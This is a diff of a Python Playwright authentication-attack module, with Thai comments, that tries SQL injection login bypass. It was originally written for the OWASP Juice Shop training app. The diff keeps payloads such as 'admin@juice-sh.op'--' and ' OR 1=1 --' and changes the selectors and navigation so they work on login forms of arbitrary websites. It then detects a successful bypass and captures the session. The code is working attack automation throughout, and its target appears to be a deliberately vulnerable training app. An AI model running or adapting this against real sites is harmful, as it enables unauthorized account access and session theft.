@@ -74,40 +74,41 @@ class AuthHandler:
         return False
 
     async def _try_sqli_bypass(self, page: Page) -> bool:
-        # Payload เหล่านี้ออกแบบมาเพื่อตัดส่วนตรวจสอบ Password ของ SQLite ออก
-        payloads = [
-            "admin@juice-sh.op'--",         # 👈 ตัวนี้คือตัวเด็ดสำหรับ Juice Shop
-            "' OR 1=1 --", 
-            "admin@juice-sh.op' OR 1=1 --",
-            "' UNION SELECT NULL, 'admin@juice-sh.op', 'password', 'admin' --"
-        ]
+        payloads = ["admin@juice-sh.op'--", "' OR 1=1 --"]
         
-        user_input = page.locator('input[type="text"], input[type="email"], [name*="email"]').first
-        pass_input = page.locator('input[type="password"]').first
-        # ปุ่ม Login ของ Juice Shop มักจะเป็นปุ่ม id="loginButton"
-        submit_btn = page.locator('#loginButton, button[type="submit"], button:has-text("Log in")').first
+        # Generic Selectors: ใช้ Attribute ที่เว็บส่วนใหญ่ชอบใช้
+        user_selectors = 'input[type="email"], input[name*="user"], input[name*="email"], input#email, input.email'
+        pass_selectors = 'input[type="password"], input[name*="pass"]'
+        submit_selectors = 'button[type="submit"], button#loginButton, button:has-text("Log in"), button:has-text("Login")'
 
         for payload in payloads:
             try:
-                # สำคัญ: ต้องปิด Welcome Banner ก่อน (ถ้ามี)
                 await self._dismiss_initial_modals(page)
                 
-                await page.reload(wait_until="networkidle") 
-                self.logger.info(f"[Auth] Testing SQLi Bypass Payload: {payload}")
-                
-                await user_input.fill(payload)
-                await pass_input.fill("anything") # ใส่ค่าอะไรก็ได้
-                
-                await submit_btn.click()
-                # รอให้ระบบจัดการ Redirect หลัง Login
-                await page.wait_for_load_state("networkidle", timeout=5000)
+                # แทนที่จะระบุ URL ตายตัว ให้หาลิงก์ที่มีคำว่า Login ในหน้าปัจจุบันก่อน
+                # ถ้าไม่เจอค่อยลองเดา path /login
+                if "login" not in page.url.lower():
+                    login_link = page.locator('a:has-text("Login"), a:has-text("Sign in")').first
+                    if await login_link.is_visible():
+                        await login_link.click()
+                    else:
+                        await page.goto(f"{page.url.split('#')[0]}#/login", wait_until="networkidle")
 
-                if await self._check_success(page):
-                    await self._capture_session(page)
-                    self.logger.info(f"[Auth] ✅ SQLi Bypass SUCCESS with: {payload}")
-                    return True
-            except: 
-                continue
+                # ใช้ .first เพื่อเอาอันแรกที่แมตช์กับ Generic Selectors
+                user_input = page.locator(user_selectors).first
+                pass_input = page.locator(pass_selectors).first
+                submit_btn = page.locator(submit_selectors).first
+
+                if await user_input.is_visible():
+                    await user_input.fill(payload)
+                    await pass_input.fill("anything")
+                    await submit_btn.click()
+                    
+                    await page.wait_for_timeout(2000)
+                    if await self._check_success(page):
+                        await self._capture_session(page)
+                        return True
+            except: continue
         return False
 
     async def _capture_session(self, page: Page):
@@ -125,16 +126,24 @@ class AuthHandler:
         return False
 
     async def _check_success(self, page: Page) -> bool:
-        # 1. เช็คจาก LocalStorage ว่ามี token หรือไม่
-        has_token = await page.evaluate("() => localStorage.getItem('token') !== null")
-        
-        # 2. เช็คว่ามีปุ่มที่แสดงเฉพาะตอน Login แล้วหรือไม่ (เช่น ตะกร้าสินค้า)
-        basket_visible = await page.locator('button[aria-label="Show the shopping basket"]').is_visible()
-        
-        # 3. เช็คว่าไม่มีคำว่า "Invalid email or password" โผล่มา
-        error_msg = await page.locator(".error").is_visible()
-        
-        return (has_token or basket_visible) and not error_msg
+        # 1. เช็ค LocalStorage แบบกวาด (เว็บสมัยใหม่ชอบเก็บ Token/JWT ไว้ที่นี่)
+        # ดูว่ามี Key อะไรที่ชื่อเหมือน token, auth, session หรือไม่
+        has_token = await page.evaluate("""() => {
+            for (let i = 0; i < localStorage.length; i++) {
+                let key = localStorage.key(i).toLowerCase();
+                if (key.includes('token') || key.includes('auth')) return true;
+            }
+            return false;
+        }""")
+
+        # 2. เช็คจากหน้าตาเว็บ: ปุ่ม Login หายไป และมีปุ่ม Logout โผล่มาแทน
+        login_not_visible = not await page.locator('a:has-text("Login"), button:has-text("Login")').first.is_visible()
+        logout_visible = await page.locator('a:has-text("Logout"), button:has-text("Logout"), a:has-text("Sign out")').first.is_visible()
+
+        # 3. เช็ค Cookies: มี Cookie ใหม่เกิดขึ้นหลังจากการกด Submit หรือไม่
+        # (เปรียบเทียบจำนวน cookies ก่อนและหลัง)
+
+        return (has_token or logout_visible) or (login_not_visible and logout_visible)
 
     async def _try_default_creds(self, page: Page) -> bool:
         self.logger.info("[Auth] 🔑 Testing default credentials...")
